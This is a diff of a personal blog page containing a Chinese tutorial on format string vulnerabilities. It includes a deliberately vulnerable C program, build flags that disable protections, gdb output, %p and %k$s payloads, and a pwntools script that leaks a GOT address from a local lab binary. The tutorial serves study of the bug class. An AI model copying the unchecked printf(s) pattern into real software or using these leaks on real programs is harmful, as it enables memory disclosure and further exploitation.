@@ -1,193 +1,185 @@
 <!DOCTYPE html>
-<html>
+<html lang=Ch>
 <head>
+    <!-- so meta -->
     <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞小解">
+<meta property="og:url" content="http://yoursite.com/2018/05/30/格式化字符串漏洞小解/index.html">
+<meta property="og:site_name" content="Peterpan's Blog">
+<meta property="og:description" content="漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%888.28.50.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%888.47.27.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%889.20.01.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-12%20%E4%B8%8B%E5%8D%885.45.20.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-12%20%E4%B8%8B%E5%8D%886.23.09.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-02%20%E4%B8%8B%E5%8D%8811.43.43.png">
+<meta property="og:updated_time" content="2018-06-12T10:31:49.347Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串漏洞小解">
+<meta name="twitter:description" content="漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张">
+<meta name="twitter:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%888.28.50.png">
     
-    <link rel="canonical" href="www.peterpan980927.cn/2018/05/30/格式化字符串漏洞小解/">
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>格式化字符串漏洞小解</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
     
     
-    <title>格式化字符串漏洞小解 | Peterpan&#39;s Blog | Mind over muscle.</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="keywords" content="漏洞挖掘">
-    <link rel="shortcut icon" href="/img/favicon.ico">
-    <link rel="stylesheet" href="/css/style.css?v=1.0.7">
-    <script type="text/javascript">
-        // Data Center
-        var DC = {
-            reward:	true,
-            lv: JSON.parse('{"enable":true,"app_id":"Ljd6bJFL9N4tWj6WnGcbYUd2-gzGzoHsz","app_key":"xDGMWtxNt0aReJDVkuYmSqBd","icon":true}'),
-            v: JSON.parse('{"enable":true,"appid":"Ljd6bJFL9N4tWj6WnGcbYUd2-gzGzoHsz","appkey":"xDGMWtxNt0aReJDVkuYmSqBd","notify":false,"verify":false,"placeholder":"望不吝赐教","avatar":"wavatar"}')
-        };
-    </script>
-    <script type="text/javascript">
-        window.lazyScripts=[];
-    </script>
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script>
 </head>
 
-
 <body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/bg.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/miao_icon.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">Peter pan</h5>
-          <a href="mailto:15d31f644fafee19d219f5d6b9ac590f" title="15d31f644fafee19d219f5d6b9ac590f" class="mail">15d31f644fafee19d219f5d6b9ac590f</a>
-        </hgroup>
-        
-        <ul class="menu-link">
-          
-              <li>
-                <a href="https://github.com/Peterpan0927" target="_blank">
-                  <i class="icon icon-lg icon-github"></i>
-                </a>
-              </li>
-            
-        </ul>
-        
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                HOME
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/tags"  >
-                <i class="icon icon-lg icon-tags"></i>
-                TAGS
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                ARCHIVES
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/about"  >
-                <i class="icon icon-lg icon-user"></i>
-                ABOUT
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://github.com/Peterpan0927" target="_blank" >
-                <i class="icon icon-lg icon-github"></i>
-                Github
-              </a>
-            </li>
-        
-      </ul>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">Peterpan&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
     </div>
   </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row clearfix">
-        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">
-            <span>格式化字符串漏洞小解</span>
-            
-        </div>
-        
-        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
-            <i class="icon icon-lg icon-search"></i>
-        </a>
-        
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
     </div>
-</header>
-<header class="content-header post-header">
-    <div class="container fade-scale">
-        <h1 class="title">格式化字符串漏洞小解</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2018-05-30T12:18:40.000Z" itemprop="datePublished" class="page-time">
-  2018-05-30
-</time>
-
-
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞/">漏洞</a></li></ul>
-
-            
-        </h5>
-        
-    </div>
-    
-
-</header>
-
-<div id="site_search">
-    <div class="search-title clearfix">
-        <span class="pull-left">
-          <i class="icon icon-lg icon-search"></i>
-        </span>
-        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
-        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
-          <i class="icon icon-lg icon-close"></i>
-        </a>
-    </div>
-    <div id="local-search-result"></div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
 </div>
 
-
-<div class="container body-wrap">
-    <article id="post-格式化字符串漏洞小解"
-  class="post-article article-type-post fade" itemprop="blogPost">
-    <div class="post-card">
-        <h1 class="post-card-title">格式化字符串漏洞小解</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2018-05-30 20:18:40" datetime="2018-05-30T12:18:40.000Z"  itemprop="datePublished">2018-05-30</time>
-
-            
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞/">漏洞</a></li></ul>
-
-
-
-            
-	<span id="/2018/05/30/格式化字符串漏洞小解/" class="leancloud_visitors" data-flag-title="格式化字符串漏洞小解" title="格式化字符串漏洞小解">
-		
-			<i class="icon icon-eye"></i>
-		
-		<span class="leancloud-visitors-count"></span>
-	</span>
- 
-
-            
-    <span>
-        <i class="icon icon-comment-o"></i>
-        <a href="/2018/05/30/格式化字符串漏洞小解/#comment">
-            <span class="valine-comment-count" data-xid="/2018/05/30/格式化字符串漏洞小解/"></span>
-        </a>
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+        
+      </ul>
     </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/06/05/在High-Serria上编译XNU内核/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/05/13/iOS上的ROP利用/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&text=格式化字符串漏洞小解"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&is_video=false&description=格式化字符串漏洞小解"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=格式化字符串漏洞小解&body=Check out this article: http://yoursite.com/2018/05/30/格式化字符串漏洞小解/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&name=格式化字符串漏洞小解&description=&lt;p&gt;漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-介绍"><span class="toc-number">1.</span> <span class="toc-text">0x00.介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">0x01.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#泄露栈内存"><span class="toc-number">2.1.</span> <span class="toc-text">泄露栈内存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取栈变量数值"><span class="toc-number">2.1.1.</span> <span class="toc-text">获取栈变量数值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取栈变量对应的字符串"><span class="toc-number">2.1.2.</span> <span class="toc-text">获取栈变量对应的字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#泄漏任意地址内存"><span class="toc-number">2.2.</span> <span class="toc-text">泄漏任意地址内存</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#补充"><span class="toc-number">3.</span> <span class="toc-text">补充</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        格式化字符串漏洞小解
+    </h1>
 
 
-            
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <p>漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张</p>
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Peterpan's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-05-30T12:18:40.000Z" itemprop="datePublished">2018-05-30</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/漏洞挖掘/">漏洞挖掘</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张</p>
 <a id="more"></a>
-<h1 id="0x00介绍"><a class="markdownIt-Anchor" href="#0x00介绍"></a> 0x00.介绍</h1>
-<p>首先对于格式化字符串不了解可以先看看<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="external">维基百科上的标准讲解</a>，原理介绍可以参见<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="external">wiki</a>，在这里只是简单的做一下介绍，如果我们有下面这样一个语句:</p>
+<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00.介绍"></a>0x00.介绍</h1><p>首先对于格式化字符串不了解可以先看看<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="external">维基百科上的标准讲解</a>，原理介绍可以参见<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/" target="_blank" rel="external">wiki</a>，在这里只是简单的做一下介绍，如果我们有下面这样一个语句:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"Hacking the %s, Hacking the %s"</span>);</div></pre></td></tr></table></figure>
 <p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
 <ol>
@@ -197,366 +189,127 @@
 </ol>
 <p>对于2，3来说倒还无妨，但是对于对于1来说，如果提供了一个不可访问地址，比如0，那么程序就会因此而崩溃。</p>
 <p>这基本就是格式化字符串漏洞的基本原理了。</p>
-<h1 id="0x01漏洞利用"><a class="markdownIt-Anchor" href="#0x01漏洞利用"></a> 0x01.漏洞利用</h1>
-<h2 id="泄露栈内存"><a class="markdownIt-Anchor" href="#泄露栈内存"></a> 泄露栈内存</h2>
-<h3 id="获取栈变量数值"><a class="markdownIt-Anchor" href="#获取栈变量数值"></a> 获取栈变量数值</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</div><div class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</div><div class="line">  <span class="built_in">printf</span>(s);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h1 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01.漏洞利用"></a>0x01.漏洞利用</h1><h2 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h2><h3 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</div><div class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</div><div class="line">  <span class="built_in">printf</span>(s);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>然后我们通过命令编译一下，关掉栈保护和PIE：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -fno-stack-protector -no-pie -o leakmemory leakmemory.c</div></pre></td></tr></table></figure>
 <p>然后我们用gdb来追踪调试看看：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(gdb) b printf</div><div class="line">Breakpoint 1 at 0x8048330</div><div class="line">(gdb) r</div><div class="line">Starting program: /home/ubuntu/leakmemory</div><div class="line">%p.%p.%p</div><div class="line"></div><div class="line">Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28</div><div class="line">28	printf.c: No such file or directory.</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">00000001.22222222.ffffffff.%p.%p.%p</div><div class="line"></div><div class="line">Breakpoint 1, __printf (format=0xbffff570 &quot;%p.%p.%p&quot;) at printf.c:28</div><div class="line">28	in printf.c</div></pre></td></tr></table></figure>
 <p>这个时候我们看看栈上的值：</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%888.28.50.png" alt="泄漏栈内存" title="" class="">
-                <p>泄漏栈内存</p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%888.28.50.png" alt="泄漏栈内存"></p>
 <p>格式化字符串的地址<code>0xbffff570</code>，然后就是格式化字符串上面的三个变量的地址，正好就是打印出来的值，我们可以通过这种方式获得栈中的任意参数，通过<code>%n$x</code>，对于打印函数来说是第<code>n+1</code>个参数。</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%888.47.27.png" alt="获得栈中第n个参数" title="" class="">
-                <p>获得栈中第n个参数</p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%888.47.27.png" alt="获得栈中第n个参数"></p>
 <p><strong>小技巧总结</strong></p>
 <blockquote>
 <ol>
 <li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li>
 <li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li>
-<li>利用%orderx来获取指定参数的值，利用%orders来获取指定参数对应地址的内容。</li>
+<li>利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。</li>
 </ol>
 </blockquote>
-<h3 id="获取栈变量对应的字符串"><a class="markdownIt-Anchor" href="#获取栈变量对应的字符串"></a> 获取栈变量对应的字符串</h3>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%889.20.01.png" alt="获取栈变量对应的字符串" title="" class="">
-                <p>获取栈变量对应的字符串</p>
-            </figure>
+<h3 id="获取栈变量对应的字符串"><a href="#获取栈变量对应的字符串" class="headerlink" title="获取栈变量对应的字符串"></a>获取栈变量对应的字符串</h3><p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-30%20%E4%B8%8B%E5%8D%889.20.01.png" alt="获取栈变量对应的字符串"></p>
 <p>解析到<code>%s</code>的时候，就会找栈上的第一个值对应的地址，然后以字符串的形式去解析，而这个值就是格式化字符串本身的地址，所以<code>%s</code>就被解析成了<code>%speterpan</code>，剩下的就是输出<code>peterpan</code>了</p>
-<h2 id="泄漏任意地址内存"><a class="markdownIt-Anchor" href="#泄漏任意地址内存"></a> 泄漏任意地址内存</h2>
-<p>其实上述的例子只是帮助理解什么是格式化字符串的漏洞，这个漏洞应该可以是可以被我们控制去泄漏一些强力有效的东西，比如说去泄漏一个libc函数的<code>got</code>表内容，从而得到其他函数的地址，如果我们知道格式化字符串在输出函数调用的时候是第几个参数，如果是第<code>k</code>个，那么我们就可以使用：</p>
+<h2 id="泄漏任意地址内存"><a href="#泄漏任意地址内存" class="headerlink" title="泄漏任意地址内存"></a>泄漏任意地址内存</h2><p>其实上述的例子只是帮助理解什么是格式化字符串的漏洞，这个漏洞应该可以是可以被我们控制去泄漏一些强力有效的东西，比如说去泄漏一个libc函数的<code>got</code>表内容，从而得到其他函数的地址，如果我们知道格式化字符串在输出函数调用的时候是第几个参数，如果是第<code>k</code>个，那么我们就可以使用：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addr%k$s</div></pre></td></tr></table></figure>
 <p>来获取某个指定地址的内容，那么怎么知道格式化字符串是第几个呢？</p>
 <p>因为在之前的例子中我们就可以栈上的第一个参数就是格式化字符串的地址，然后我们会以字符串的形式去解析这个地方的值，那么如果我们传的字符串是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AAAA(机器长)%p%p%p%p%p%p%p</div></pre></td></tr></table></figure>
 <p>那么输出的时候找到地址如果是连续一样的说明就是第几个参数:</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-12%20%E4%B8%8B%E5%8D%885.45.20.png" alt="格式化字符串在输出函数中是第几个参数" title="" class="">
-                <p>格式化字符串在输出函数中是第几个参数</p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-12%20%E4%B8%8B%E5%8D%885.45.20.png" alt="格式化字符串在输出函数中是第几个参数"></p>
 <p>从这里看到<code>0x41414141</code>是连续的4个，那么就是第4个参数，这个时候如果我们想知道<code>scanf</code>的地址，那么我们获取到<code>scanf@got</code>的值之后用上面的方式就可以去拿到了。</p>
 <p>我们通过python来构造一个<code>payload</code>:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">sh = process(<span class="string">'./leakmemory'</span>)</div><div class="line">leakmemory=ELF(<span class="string">'./leakmemory'</span>)</div><div class="line">__isoc99_scanf_got=leakmemory.got[<span class="string">'__isoc99_scanf'</span>]</div><div class="line"><span class="keyword">print</span> (hex(__isoc99_scanf_got))</div><div class="line">payload=p32(__isoc99_scanf_got)+<span class="string">'%4$s'</span></div><div class="line"><span class="keyword">print</span> (payload)</div><div class="line">context.terminal= [<span class="string">"terminator"</span>, <span class="string">"-e"</span>]</div><div class="line">sh.sendline(payload)</div><div class="line">sh.recvuntil(<span class="string">'%4$s\n'</span>)</div><div class="line">print(hex(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>])))</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure>
 <p>执行效果为：</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-12%20%E4%B8%8B%E5%8D%886.23.09.png" alt="泄漏scanf地址" title="" class="">
-                <p>泄漏scanf地址</p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-12%20%E4%B8%8B%E5%8D%886.23.09.png" alt="泄漏scanf地址"></p>
 <p>如果地址不是偏移机器字长的整数倍，我们还需要手动填充，不然就会像找格式化字符串是第几个参数的那张图中描述的一样，被系统填充，这样就会跳转到其他的位置去了。</p>
 <p>但是我们不能直接将<code>got</code>表中的地址(<code>\x14\xa0\x0</code>)传进去，因为<code>scanf</code>不会将其识别为对应的字符串，而是分别作为一个字符读入，这样就会出错。</p>
-<h1 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充</h1>
-<p>在intel平台上XNU对于<code>trap</code>和<code>interrupt</code>的描述</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-02%20%E4%B8%8B%E5%8D%8811.43.43.png" alt="公共分发器" title="" class="">
-                <p>公共分发器</p>
-            </figure>
-        </div>
-        
-        
-<blockquote class="post-copyright">
-    <div class="content">
-        
-<span class="post-time">
-    Last updated: <time datetime="2018-06-12T10:31:49.347Z" itemprop="dateUpdated">2018-06-12 18:31:49</time>
-</span><br>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>在intel平台上XNU对于<code>trap</code>和<code>interrupt</code>的描述</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-02%20%E4%B8%8B%E5%8D%8811.43.43.png" alt="公共分发器"></p>
 
-
-        
-        转载注明出处，原文地址：<a href="/2018/05/30/格式化字符串漏洞小解/" target="_blank" rel="external">http://yoursite.com/2018/05/30/格式化字符串漏洞小解/</a>
-        
-    </div>
-    <footer>
-        <a href="http://yoursite.com">
-            <img src="/img/miao_icon.jpg" alt="Peter pan">
-            Peter pan
-        </a>
-    </footer>
-</blockquote>
-
-        
-            <div class="page-reward">
